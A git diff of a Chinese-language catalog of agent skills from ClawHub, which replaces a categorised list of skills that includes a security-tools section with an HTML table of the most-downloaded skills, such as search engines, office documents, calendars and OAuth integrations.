-| Veo 3 Video Gen | [Clawdbot/veo3-video-gen](https://clawdhub.com/skills/veo3-video-gen) | 使用 Gemini API (google-genai) 通过 Google Veo 3.x 生成和拼接短视频。当您需要根据提示创建视频剪辑（广告、UGC 风格剪辑、产品演示）并需要可重复的 CLI 工作流程（生成、轮询、下载 MP4、选择性拼接多个片段）时使用。 |
-| Browser CDP MCP | [Clawdbot/verify-on-browser](https://clawdhub.com/skills/verify-on-browser) | 通过 Chrome DevTools 协议控制浏览器 - 完全 CDP 访问 |
-| Browser CDP MCP | [Clawdbot/verify-on-browser-1-0-0](https://clawdhub.com/skills/verify-on-browser-1-0-0) | 通过 Chrome DevTools 协议控制浏览器 - 完全 CDP 访问 |
-| VoiceMonkey | [Clawdbot/voicemonkey](https://clawdhub.com/skills/voicemonkey) | 通过 VoiceMonkey API v2 控制 Alexa 设备 - 发布公告、触发例程、启动流程和显示媒体。 |
-| Webchat 音频通知 | [Clawdbot/webchat-audio-notifications](https://clawdhub.com/skills/webchat-audio-notifications) | 将浏览器音频通知添加到 Moltbot/Clawdbot 网络聊天中，具有 5 个强度级别 - 从耳语到不可能错过（仅当选项卡处于后台时）。 |
-| WhatsApp Video Maker | [Clawdbot/whatsapp-video-mockup](https://clawdhub.com/skills/whatsapp-video-mockup) | （无） |
-| WHOOP Central | [Clawdbot/whoop-central](https://clawdhub.com/skills/whoop-central) | WHOOP Central - 用于获取 WHOOP 数据（睡眠、恢复、紧张、锻炼）的 OAuth + 脚本。当用户询问他们的睡眠、恢复分数、HRV、应变或锻炼数据时使用。 |
-| Willhaben | [Clawdbot/willhaben](https://clawdhub.com/skills/willhaben) | 在 Willhaben.at（奥地利市场）上创建和管理列表。当用户想要出售某些东西、创建列表或提及 Willhaben 时使用。处理照片上传，生成标题/描述/价格，并通过浏览器自动化发布。 |
-| X Articles | [Clawdbot/x-articles](https://clawdhub.com/skills/x-articles) | 使用病毒式格式、挂钩模式和浏览器自动化创建和发布 X (Twitter) 文章。处理 Draft.js 怪癖、嵌入限制和图像上传。 |
+> 该分类共 **4,424** 个技能，以下按下载量倒序展示 Top 200。
 
-### 🔒 安全工具
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 可访问性审计器 | [Clawdbot/a11y-auditor](https://clawdhub.com/skills/a11y-auditor) | 扫描 HTML 和 JSX 是否存在可访问性问题并获取修复建议。当您需要在 WCAG 违规投入生产之前捕获它们时使用。 |
-| API 凭证管理 | [Clawdbot/api-credentials-hygiene](https://clawdhub.com/skills/api-credentials-hygiene) | 审核并强化 API 凭证处理（环境变量、分离、轮换计划、最小权限、可审核性）。在集成服务或准备必须安全管理机密的生产部署时使用。 |
-| Apple Media 控制 | [Clawdbot/apple-media](https://clawdhub.com/skills/apple-media) | 通过 pyatv 控制 Apple TV、HomePod 和 AirPlay 设备（扫描、流媒体、播放、音量、导航）。 |
-| Apple Media 控制 | [Clawdbot/apple-media-officialpm](https://clawdhub.com/skills/apple-media-officialpm) | 从 macOS 发现和控制 Apple 媒体/AirPlay 设备（HomePod、Apple TV、AirPlay 扬声器）。当您想要扫描 AirPlay 设备、映射名称→IP/ID、配对/连接以及使用 pyatv (atvremote) 和 Airfoil 控制播放/音量时使用。 |
-| NPM 审计修复器 | [Clawdbot/audit-fix](https://clawdhub.com/skills/audit-fix) | 使用 AI 分析 npm 审计输出并获取可行的修复建议。在处理安全漏洞时使用。 |
-| NPM 审计修复器 | [Clawdbot/audit-fixer](https://clawdhub.com/skills/audit-fixer) | 使用 AI 分析 npm 审计输出并获取可行的修复建议。在处理安全漏洞时使用。 |
-| Auth Auditor | [Clawdbot/auth-auditor](https://clawdhub.com/skills/auth-auditor) | 审核您的身份验证实施是否存在安全缺陷。当您需要验证您的身份验证确实安全时使用。 |
-| Solana 开发导师 | [Clawdbot/cabin-sol](https://clawdhub.com/skills/cabin-sol) | Solana 开发导师和构建者。通过挑战、Anchor 框架、Token-2022、压缩 NFT 和安全最佳实践来教授程序开发。 “回归原始计算。” |
-| ClawdLink 加密消息 | [Clawdbot/clawdlink](https://clawdhub.com/skills/clawdlink) | 加密的 Clawdbot 到 Clawdbot 消息传递。通过端到端加密向朋友的 Clawdbot 发送消息。 |
-| CSP 生成器 | [Clawdbot/csp-gen](https://clawdhub.com/skills/csp-gen) | 为您的站点生成内容安全策略标头。当您需要添加 CSP 标头而无需花费数小时阅读规范时使用。 |
-| DVSA/TC 审计准备（英国） | [Clawdbot/dvsa-tc-audit-readiness-operator-licence-uk](https://clawdhub.com/skills/dvsa-tc-audit-readiness-operator-licence-uk) | 建立 DVSA/交通专员“展示”审核准备清单和证据索引。在准备审核或操作员许可证审查时使用。 |
-| 不安全默认值检测 | [Clawdbot/insecure-defaults](https://clawdhub.com/skills/insecure-defaults) | 检测允许应用程序在生产中不安全运行的故障开放不安全默认设置（硬编码机密、弱身份验证、宽松的安全性）。在审核安全性、检查配置管理或分析环境变量处理时使用。 |
-| Meta Tags 生成器 | [Clawdbot/meta-tags-gen](https://clawdhub.com/skills/meta-tags-gen) | 扫描页面并生成缺失的元标记。改进 SEO 时使用。 |
-| 新闻聚合器 | [Clawdbot/news-aggregator-skill](https://clawdhub.com/skills/news-aggregator-skill) | 综合新闻聚合器，从 8 个主要来源获取、过滤和深度分析实时内容：Hacker News、GitHub Trending、Product Hunt、36Kr、腾讯新闻、WallStreetCN、V2EX 和微博。最适合“每日扫描”、“科技新闻简报”、“财经动态”和热点话题的“深度解读”。 |
-| 新闻聚合器 | [Clawdbot/news-aggregator-skill-2](https://clawdhub.com/skills/news-aggregator-skill-2) | 综合新闻聚合器，从 8 个主要来源获取、过滤和深度分析实时内容：Hacker News、GitHub Trending、Product Hunt、36Kr、腾讯新闻、WallStreetCN、V2EX 和微博。最适合“每日扫描”、“科技新闻简报”、“财经动态”和热点话题的“深度解读”。 |
-| 权限审计器 | [Clawdbot/permission-auditor](https://clawdhub.com/skills/permission-auditor) | 从您的路由生成 RBAC 权限配置。当您需要基于角色的访问控制而无需从头开始构建时使用。 |
-| Spots Google Places | [Clawdbot/spots](https://clawdhub.com/skills/spots) | 使用基于网格的扫描进行详尽的 Google Places 搜索。查找所有地点，而不仅仅是 Google 搜索到的地点。 |
-| Supabase 生成器 | [Clawdbot/supabase-gen](https://clawdhub.com/skills/supabase-gen) | 从 Prisma 架构生成 Supabase RLS 策略。在为表设置行级安全性时使用。 |
-| UI Audit | [Clawdbot/ui-audit](https://clawdhub.com/skills/ui-audit) | 用于自动化 UI 审核的 AI 技能。根据视觉层次结构、可访问性、认知负荷、导航等方面经过验证的用户体验原则评估界面。基于 Tommy Geoco 的《用户体验决策》。 |
-| Web Design Guidelines | [Clawdbot/web-design-guidelines](https://clawdhub.com/skills/web-design-guidelines) | 检查 UI 代码是否符合 Web 界面指南。当被要求“检查我的 UI”、“检查可访问性”、“审核设计”、“检查 UX”或“根据最佳实践检查我的网站”时使用。 |
-| What would Elon do | [Clawdbot/wed](https://clawdhub.com/skills/wed) | 安全意识演示 - 演示人工智能编码助手中的供应链风险。查看完整研究：https://x.com/theonejvo/status/2015892980851474595 |
-| Wrangler | [Clawdbot/wrangler](https://clawdhub.com/skills/wrangler) | 使用 Wrangler CLI 管理 Cloudflare Workers、KV、D1、R2 和密钥。在部署工作人员、管理数据库、存储对象或配置 Cloudflare 资源时使用。涵盖工作部署、KV 命名空间、D1 SQL 数据库、R2 对象存储、机密管理和尾随日志。 |
+<table>
+<colgroup>
+<col width="4%">
+<col width="8%">
+<col width="14%">
+<col width="14%">
+<col width="60%">
+</colgroup>
+<thead>
+<tr>
+<th align="center">#</th>
+<th>中文技能名称</th>
+<th>技能名称</th>
+<th>链接</th>
+<th>核心功能</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">1</td>
+<td>天气查询</td>
+<td>Weather</td>
+<td><a href="https://clawdhub.com/skills/weather">ClawHub/weather</a></td>
+<td>获取当前天气和预报（无需API密钥）</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td>多搜索引擎</td>
+<td>Multi Search Engine</td>
+<td><a href="https://clawdhub.com/skills/multi-search-engine">ClawHub/multi-search-engine</a></td>
+<td>集成16个搜索引擎（7个国内+9个全球），支持高级搜索运算符、时间过滤、站点搜索、隐私搜索引擎以及Wolfra...</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td>Word 文档处理</td>
+<td>Word / DOCX</td>
+<td><a href="https://clawdhub.com/skills/word-docx">ClawHub/word-docx</a></td>
+<td>创建、检查和编辑 Microsoft Word 文档及 DOCX 文件，支持样式、编号、修订记录、表格、分节符及兼容性检查等功能。</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td>NanoPDF</td>
+<td>Nano Pdf</td>
+<td><a href="https://clawdhub.com/skills/nano-pdf">ClawHub/nano-pdf</a></td>
+<td>使用nano-pdf CLI通过自然语言指令编辑PDF</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td>Obsidian 笔记</td>
+<td>Obsidian</td>
+<td><a href="https://clawdhub.com/skills/obsidian">ClawHub/obsidian</a></td>
+<td>操作 Obsidian 仓库（纯 Markdown 笔记）并通过 obsidian-cli 自动化。</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td>百度搜索</td>
+<td>Baidu web search 🔑</td>
+<td><a href="https://clawdhub.com/skills/baidu-search">ClawHub/baidu-search</a></td>
+<td>使用百度AI搜索引擎(BDSE)进行网络搜索。适用于获取实时信息、文档资料或研究课题。</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td>搜索</td>
+<td>Tavily 搜索 🔑</td>
+<td><a href="https://clawdhub.com/skills/openclaw-tavily-search">ClawHub/openclaw-tavily-search</a></td>
+<td>通过 Tavily API 进行网页搜索（Brave 替代方案）。当用户要求搜索网页、查找来源或链接，且 Brave 网页搜索不可用时使用。</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td>Notion 集成</td>
+<td>Notion 🔑</td>
+<td><a href="https://clawdhub.com/skills/notion">ClawHub/notion</a></td>
+<td>用于创建和管理页面、数据库及块的 Notion API。</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td>Sonoscli</td>
+<td>Sonoscli</td>
+<td><a href="https://clawdhub.com/skills/sonoscli">ClawHub/sonoscli</a></td>
+<td>控制Sonos音箱（发现/状态/播放/音量/分组）</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td>自动化工作流</td>
+<td>Automation Workflows</td>
+<td><a href="https://clawdhub.com/skills/automation-workflows">ClawHub/automation-workflows</a></td>
+<td>设计和实施自动化工作流，帮助个体创业者节省时间并扩展业务。用于识别可自动化的重复性任务、跨工具构建工作流、设置触发器和操作，或优化现有自动化。涵盖自动化机会识别、工作流设计、工具选择（Zapier、Make、n8n）、测试及维护。</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td>腾讯文档</td>
+<td>腾讯文档 TENCENT DOCS 🔑</td>
+<td><a href="https://skillhub.cn/skill/tencent-docs">SkillHub/tencent-docs</a></td>
+<td>腾讯文档（docs.qq.com）-在线云文档平台，是创建、编辑、管理文档的首选 skill。涉及&quot;新建/创建/编辑/读取/查看/搜索文档&quot;、&quot;保存文件&quot;、&quot;云文档&quot;、&quot;腾讯文档&quot;、&quot;docs.qq.com&quot;等操作，请优先使用本 skill。支持能力：(1) 创建各类在线文档（文档/Word/Excel/幻灯片/思维导图/流程图/智能表格/收集表）(2) 管理知识库空间（创建空间、查询空间列...</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td>Brave 搜索</td>
+<td>Brave Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/brave-search">ClawHub/brave-search</a></td>
+<td>通过 Brave Search API 进行网页搜索与内容提取。适用于搜索文档、事实或任何网页内容。轻量级，无需浏览器。</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td>desktop控制</td>
+<td>Desktop Control</td>
+<td><a href="https://clawdhub.com/skills/desktop-control">ClawHub/desktop-control</a></td>
+<td>{   &quot;answer&quot;: &quot;具备鼠标、键盘和屏幕控制的高级桌面自动化&quot; }</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td>新闻摘要</td>
+<td>News Summary 🔑</td>
+<td><a href="https://clawdhub.com/skills/news-summary">ClawHub/news-summary</a></td>
+<td>当用户询问新闻更新、每日简报或天下大事时使用此技能。从受信任的国际RSS源获取新闻，并可生成语音摘要。</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td>YouTubeWatcher</td>
+<td>YouTube Watcher</td>
+<td><a href="https://clawdhub.com/skills/youtube-watcher">ClawHub/youtube-watcher</a></td>
+<td>获取并读取YouTube视频字幕。适用于需要总结视频、回答视频相关问题或提取视频信息的场景。</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td>Powerpoint / PPTX</td>
+<td>Powerpoint / PPTX</td>
+<td><a href="https://clawdhub.com/skills/powerpoint-pptx">ClawHub/powerpoint-pptx</a></td>
+<td>创建、检查和编辑 Microsoft PowerPoint 演示文稿及 PPTX 文件，支持可靠的布局、模板、占位符、备注、图表和视觉质检。使用...</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td>PDF</td>
+<td>Pdf</td>
+<td><a href="https://clawdhub.com/skills/pdf">ClawHub/pdf</a></td>
+<td>全面的PDF处理工具包，支持提取文本和表格、创建新PDF、合并/拆分文档及表单填写。Claude需要大规模程序化处理、生成或分析PDF时使用。</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td>Trello</td>
+<td>Trello 🔑</td>
+<td><a href="https://clawdhub.com/skills/trello">ClawHub/trello</a></td>
+<td>使用 Trello REST API 管理看板、列表和卡片</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td>技能findercn</td>
+<td>Skill Finder Cn</td>
+<td><a href="https://clawdhub.com/skills/skill-finder-cn">ClawHub/skill-finder-cn</a></td>
+<td>Skill 查找器 | Skill Finder. 帮助发现和安装 ClawHub Skills | Discover and install ClawHub Skills. 回答'有什么技能可以X'、'找一个技能' | Answers 'what skill can X', 'find a skill'. 触发...</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td>网页搜索</td>
+<td>Web Search</td>
+<td><a href="https://clawdhub.com/skills/web-search">ClawHub/web-search</a></td>
+<td>此技能用于搜索网络信息、查找当前内容、查询新闻文章、图片或视频。它通过 DuckDuckGo 搜索 API 以文本、Markdown 或 JSON 格式返回简洁结果，适用于研究、事实核查、获取最新信息或收集网络资源。</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td>apple笔记</td>
+<td>Apple Notes</td>
+<td><a href="https://clawdhub.com/skills/apple-notes">ClawHub/apple-notes</a></td>
+<td>在 macOS 上通过 `memo` CLI 管理 Apple Notes（创建、查看、编辑、删除、搜索、移动和导出备忘录）。当用户请求添加、列出、搜索备忘录或管理文件夹时使用。</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td>网页搜索exa</td>
+<td>Web Search by Exa</td>
+<td><a href="https://clawdhub.com/skills/web-search-exa">ClawHub/web-search-exa</a></td>
+<td>{&quot;answer&quot;:&quot;通过Exa MCP服务器进行神经网页搜索、内容提取、公司与人物调研、代码搜索及深度调研。适用于：(1) 搜...&quot;}</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td>微软Excel</td>
+<td>Microsoft Excel 🔑</td>
+<td><a href="https://clawdhub.com/skills/microsoft-excel">ClawHub/microsoft-excel</a></td>
+<td>通过托管 OAuth 集成 Microsoft Excel API，实现对 OneDrive 中 Excel 工作簿、工作表、区域、表格和图表的读写。使用此技能...</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td>ddg网页搜索</td>
+<td>DuckDuckGo Web Search</td>
+<td><a href="https://clawdhub.com/skills/ddg-web-search">ClawHub/ddg-web-search</a></td>
+<td>通过 web_fetch 使用 DuckDuckGo Lite 进行无 API 密钥的网络搜索。当 web_search 因缺少 Brave API 密钥失败时作为后备，或在你...</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td>caldav日历</td>
+<td>Caldav Calendar 🔑</td>
+<td><a href="https://clawdhub.com/skills/caldav-calendar">ClawHub/caldav-calendar</a></td>
+<td>使用 vdirsyncer + khal 同步并查询 CalDAV 日历（iCloud、Google、Fastmail、Nextcloud 等）。适用于 Linux。</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td>healthcheck</td>
+<td>healthcheck</td>
+<td><a href="https://clawdhub.com/skills/healthcheck">ClawHub/healthcheck</a></td>
+<td>使用 JSON 文件存储追踪饮水和睡眠</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td>DuckDuckGo搜索</td>
+<td>Performs web searches using DuckDuckGo to retrieve real-time information from the internet. Use when the user needs to search for current events, documentation, tutorials, or any information that requires web search capabilities.</td>
+<td><a href="https://clawdhub.com/skills/duckduckgo-search">ClawHub/duckduckgo-search</a></td>
+<td>使用DuckDuckGo进行网络搜索以获取实时信息。适用于用户需要搜索时事、文档、教程等需联网查询的信息。</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td>apple提醒</td>
+<td>Apple Reminders</td>
+<td><a href="https://clawdhub.com/skills/apple-reminders">ClawHub/apple-reminders</a></td>
+<td>通过 macOS 上的 `remindctl` CLI 管理 Apple 提醒事项（列出、添加、编辑、完成、删除），支持列表、日期筛选及 JSON/纯文本输出。</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td>exa网页搜索免费</td>
+<td>Exa Web Search (Free)</td>
+<td><a href="https://clawdhub.com/skills/exa-web-search-free">ClawHub/exa-web-search-free</a></td>
+<td>通过Exa MCP进行免费AI搜索。网络搜索新闻/信息，代码搜索GitHub/StackOverflow的文档/示例，公司研究获取商业情报。无需API密钥。</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td>微信article搜索</td>
+<td>Wechat Article Search</td>
+<td><a href="https://clawdhub.com/skills/wechat-article-search">ClawHub/wechat-article-search</a></td>
+<td>搜索微信公众号文章技能。通过微信搜索获取文章列表，覆盖科技/AI、社会热点、财经、教育、职场等各类中文资讯；可按关键词检索并返回标题、概要、发布时间、来源公众号与链接。当用户需要查找微信公众号文章、整理参考资料或快速获取文章信息时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td>LNBits Wallet wtih QR Code</td>
+<td>LNBits Wallet wtih QR Code 🔑</td>
+<td><a href="https://clawdhub.com/skills/lnbits-with-qrcode">ClawHub/lnbits-with-qrcode</a></td>
+<td>管理 LNbits 闪电钱包（余额、支付、收款）</td>
+</tr>
+<tr>
+<td align="center">32</td>
+<td>Productivity</td>
+<td>Productivity</td>
+<td><a href="https://clawdhub.com/skills/productivity">ClawHub/productivity</a></td>
+<td>计划、专注并完成工作，涵盖精力管理、时间块、目标、项目、任务、习惯、回顾、优先级及情境化生产力。</td>
+</tr>
+<tr>
+<td align="center">33</td>
+<td>命理大师</td>
+<td>命理大师</td>
+<td><a href="https://clawdhub.com/skills/university-applications">ClawHub/university-applications</a></td>
+<td>全体系命理大师——集八字/四柱、紫微斗数、奇门遁甲、六爻、梅花易数、塔罗、西方星盘、数字命理、九宫飞星风水、择时择吉于一身。支持用户注册与档案管理、每日运势自动推送、交互式六爻占卜界面、九宫飞星计算脚本、HTML报告生成。自动识别体系与资料完整度，按S/A/B/C四级精度输出解读。触...</td>
+</tr>
+<tr>
+<td align="center">34</td>
+<td>谷歌slides</td>
+<td>Google Slides 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-slides">ClawHub/google-slides</a></td>
+<td>通过托管OAuth集成Google Slides API，创建演示文稿、添加幻灯片、插入内容并管理幻灯片格式。当用户想要创建演示文稿时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">35</td>
+<td>智能每周报告</td>
+<td>Report Generator</td>
+<td><a href="https://clawdhub.com/skills/smart-weekly-report">ClawHub/smart-weekly-report</a></td>
+<td>根据您的职业角色和本周工作内容，自动提炼关键信息，生成结构化、专业且具有洞察力的周报，包括问题分析与下周计划。</td>
+</tr>
+<tr>
+<td align="center">36</td>
+<td>笔记</td>
+<td>Get笔记 🔑</td>
+<td><a href="https://clawdhub.com/skills/getnote">ClawHub/getnote</a></td>
+<td>Get笔记 - 保存、搜索、管理个人笔记和知识库。 **当以下情况时使用此 Skill**： (1) 用户要保存内容到笔记：发链接、发图片、说「记一下」「存到笔记」「保存」「收藏」 (2) 用户要搜索或查看笔记：「搜一下」「找找笔记」「最近存了什么」「看看原文」 (3) 用户要管理知识库或标签：「加到知识库」「建...</td>
+</tr>
+<tr>
+<td align="center">37</td>
+<td>规划with文件</td>
+<td>Planning with files</td>
+<td><a href="https://clawdhub.com/skills/planning-with-files">ClawHub/planning-with-files</a></td>
+<td>实现Manus风格的文件规划，用于组织和跟踪复杂任务进度。创建task_plan.md、findings.md、progress.md。适用于需要时。</td>
+</tr>
+<tr>
+<td align="center">38</td>
+<td>Xero</td>
+<td>Xero 🔑</td>
+<td><a href="https://clawdhub.com/skills/xero">ClawHub/xero</a></td>
+<td>通过托管OAuth实现Xero API集成。可管理联系人、发票、付款、账户，并生成财务报告。当用户希望与Xero进行交互时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">39</td>
+<td>日历管理</td>
+<td>Calendar</td>
+<td><a href="https://clawdhub.com/skills/calendar">ClawHub/calendar</a></td>
+<td>日历管理与日程安排。创建事件、管理会议，并实现多日历平台同步。</td>
+</tr>
+<tr>
+<td align="center">40</td>
+<td>Shopify</td>
+<td>Shopify 🔑</td>
+<td><a href="https://clawdhub.com/skills/shopify">ClawHub/shopify</a></td>
+<td>{&quot;answer&quot;:&quot;Shopify集成维护中，请联系 founders@maton.ai 获取帮助。&quot;}</td>
+</tr>
+<tr>
+<td align="center">41</td>
+<td>Typeform</td>
+<td>Typeform 🔑</td>
+<td><a href="https://clawdhub.com/skills/typeform">ClawHub/typeform</a></td>
+<td>使用托管OAuth集成Typeform API，创建表单、管理回复并获取洞察。用户想与Typeform交互时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td>PPT</td>
+<td>ppt</td>
+<td><a href="https://clawdhub.com/skills/ppt">ClawHub/ppt</a></td>
+<td>将用户讲稿一键生成乔布斯风极简科技感竖屏HTML演示稿。当用户需要生成PPT、演示文稿、Slides、幻灯片，或要求科技风/极简风/乔布斯风格的演示时触发此技能。输出为单个可直接运行的HTML文件。</td>
+</tr>
+<tr>
+<td align="center">43</td>
+<td>Todoist</td>
+<td>Todoist 🔑</td>
+<td><a href="https://clawdhub.com/skills/todoist">ClawHub/todoist</a></td>
+<td>在Todoist中管理任务与项目。当用户询问任务、待办事项、提醒或生产力相关问题时使用。</td>
+</tr>
+<tr>
+<td align="center">44</td>
+<td>Qq Zone Photo</td>
+<td>Qq Zone Photo 🔑</td>
+<td><a href="https://clawdhub.com/skills/qq-zone-photo">ClawHub/qq-zone-photo</a></td>
+<td>管理 QQ空间相册。支持扫码登录、列出相册、浏览照片、上传照片、下载照片/相册、创建相册。当用户需要备份、整理或管理 QQ空间中的照片时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">45</td>
+<td>weiyun技能</td>
+<td>Weiyun Skills 🔑</td>
+<td><a href="https://clawdhub.com/skills/weiyun-skills">ClawHub/weiyun-skills</a></td>
+<td>仅在用户明确要求执行腾讯微云特定云存储操作时使用，例如上传、下载指定文件。</td>
+</tr>
+<tr>
+<td align="center">46</td>
+<td>ClickUp</td>
+<td>ClickUp 🔑</td>
+<td><a href="https://clawdhub.com/skills/clickup-api">ClawHub/clickup-api</a></td>
+<td>ClickUp API integration with managed OAuth. Access tasks, lists, folders, spaces, workspaces, users, and manage webhooks. Use this skill when users want to m...</td>
+</tr>
+<tr>
+<td align="center">47</td>
+<td>juejin技能</td>
+<td>Juejin 🔑</td>
+<td><a href="https://clawdhub.com/skills/juejin-skills">ClawHub/juejin-skills</a></td>
+<td>掘金技术社区一站式操作技能，支持排行榜查询、Markdown 文章一键发布及下载为 Markdown。</td>
+</tr>
+<tr>
+<td align="center">48</td>
+<td>家居助手</td>
+<td>Home Assistant 🔑</td>
+<td><a href="https://clawdhub.com/skills/home-assistant">ClawHub/home-assistant</a></td>
+<td>控制Home Assistant智能家居设备、运行自动化并接收webhook事件。适用于控制灯光、开关、温控、场景、脚本或任意HA实体。支持通过REST API（出站）和webhook（入站触发）进行双向通信。</td>
+</tr>
+<tr>
+<td align="center">49</td>
+<td>Calendly</td>
+<td>Calendly 🔑</td>
+<td><a href="https://clawdhub.com/skills/calendly-api">ClawHub/calendly-api</a></td>
+<td>通过托管 OAuth 实现 Calendly API 集成，可获取事件类型、已排程事件、受邀者、可用性并管理 Webhooks。使用此技能当用户想要...</td>
+</tr>
+<tr>
+<td align="center">50</td>
+<td>Asana</td>
+<td>Asana 🔑</td>
+<td><a href="https://clawdhub.com/skills/asana-api">ClawHub/asana-api</a></td>
+<td>通过托管OAuth实现Asana API集成，可访问任务、项目、工作区、用户并管理Webhook，适用于用户需要管理工作项的场景</td>
+</tr>
+<tr>
+<td align="center">51</td>
+<td>Fathom</td>
+<td>Fathom 🔑</td>
+<td><a href="https://clawdhub.com/skills/fathom-api">ClawHub/fathom-api</a></td>
+<td>通过托管 OAuth 集成 Fathom API，访问会议录音、转录、摘要并管理 Webhook，适用于用户需要检索...</td>
+</tr>
+<tr>
+<td align="center">52</td>
+<td>n8n</td>
+<td>n8n 🔑</td>
+<td><a href="https://clawdhub.com/skills/n8n">ClawHub/n8n</a></td>
+<td>通过 API 管理 n8n 工作流和自动化。适用于列出工作流、激活/停用、检查执行状态、手动触发工作流或调试自动化问题。</td>
+</tr>
+<tr>
+<td align="center">53</td>
+<td>office文档specialist套件</td>
+<td>Office Document Specialist Suite</td>
+<td><a href="https://clawdhub.com/skills/office-document-specialist-suite">ClawHub/office-document-specialist-suite</a></td>
+<td>高级套件，用于创建、编辑和分析 Microsoft Office 文档（Word、Excel、PowerPoint），提供专业的自动化报告工具。</td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td>Pipedrive</td>
+<td>Pipedrive 🔑</td>
+<td><a href="https://clawdhub.com/skills/pipedrive-api">ClawHub/pipedrive-api</a></td>
+<td>通过托管OAuth集成Pipedrive API，可管理交易、联系人、组织、活动和管道。当用户需要与 Pipedrive交互时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">55</td>
+<td>post求职</td>
+<td>post-job 🔑</td>
+<td><a href="https://clawdhub.com/skills/post-job">ClawHub/post-job</a></td>
+<td>在20多个招聘网站（如LinkedIn、Indeed、Ziprecruiter等）发布免费招聘信息，以邮件方式收取求职者简历。</td>
+</tr>
+<tr>
+<td align="center">56</td>
+<td>WooCommerce</td>
+<td>WooCommerce 🔑</td>
+<td><a href="https://clawdhub.com/skills/woocommerce">ClawHub/woocommerce</a></td>
+<td>通过托管OAuth集成WooCommerce REST API，可访问产品、订单、客户、优惠券、运输、税费、报告和Webhook。在需要使用WooCommerce API的场景下使用此技能。</td>
+</tr>
+<tr>
+<td align="center">57</td>
+<td>Monday.com</td>
+<td>Monday.com 🔑</td>
+<td><a href="https://clawdhub.com/skills/monday">ClawHub/monday</a></td>
+<td>通过托管OAuth集成Monday.com API，使用GraphQL管理看板、项、列、群组和工作区。适用于用户需要创建...</td>
+</tr>
+<tr>
+<td align="center">58</td>
+<td>Office</td>
+<td>Office</td>
+<td><a href="https://clawdhub.com/skills/office">ClawHub/office</a></td>
+<td>{&quot;answer&quot;:&quot;掌握Excel、Word、PowerPoint和Google Workspace，熟练运用公式、格式设置与自动化。&quot;}</td>
+</tr>
+<tr>
+<td align="center">59</td>
+<td>谷歌搜索</td>
+<td>google-search 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-search">ClawHub/google-search</a></td>
+<td>使用 Google 自定义搜索引擎 (PSE) 搜索网页。当需要最新信息、文档或研究主题且内置 web_search 不可用时使用。</td>
+</tr>
+<tr>
+<td align="center">60</td>
+<td>Trello</td>
+<td>Trello 🔑</td>
+<td><a href="https://clawdhub.com/skills/trello-api">ClawHub/trello-api</a></td>
+<td>通过托管OAuth集成Trello API，管理看板、列表、卡片、成员和标签。当用户想要与Trello交互进行项目时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">61</td>
+<td>邮件每日摘要</td>
+<td>Automatically logs into email accounts (Gmail, Outlook, QQ Mail, etc.) and generates daily email summaries. Use when the user wants to get a summary of their emails, check important messages, or create daily email digests.</td>
+<td><a href="https://clawdhub.com/skills/email-daily-summary">ClawHub/email-daily-summary</a></td>
+<td>自动登录邮箱账户（Gmail、Outlook、QQ邮箱等）并生成每日邮件摘要。用于获取邮件摘要、查看重要邮件或创建每日邮件简报。</td>
+</tr>
+<tr>
+<td align="center">62</td>
+<td>desearch网页搜索</td>
+<td>Web Search by Desearch 🔑</td>
+<td><a href="https://clawdhub.com/skills/desearch-web-search">ClawHub/desearch-web-search</a></td>
+<td>搜索网络，获取实时搜索结果，包含标题、URL和摘要。用于需要当前链接和信息的一般网络查询。</td>
+</tr>
+<tr>
+<td align="center">63</td>
+<td>谷歌日历</td>
+<td>Google Calendar 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-calendar">ClawHub/google-calendar</a></td>
+<td>通过 Google Calendar API 与 Google 日历交互，包括列出即将到来的活动、创建、更新或删除活动。当需要在 OpenClaw 中以编程方式访问日历时使用此技能。</td>
+</tr>
+<tr>
+<td align="center">64</td>
+<td>ZohoCRM</td>
+<td>Zoho CRM 🔑</td>
+<td><a href="https://clawdhub.com/skills/zoho-crm">ClawHub/zoho-crm</a></td>
+<td>使用托管OAuth集成Zoho CRM API，管理潜在客户、联系人、账户、交易等CRM记录，适用于用户读取、创建...</td>
+</tr>
+<tr>
+<td align="center">65</td>
+<td>gcalcli日历</td>
+<td>Google Calendar (via gcalcli)</td>
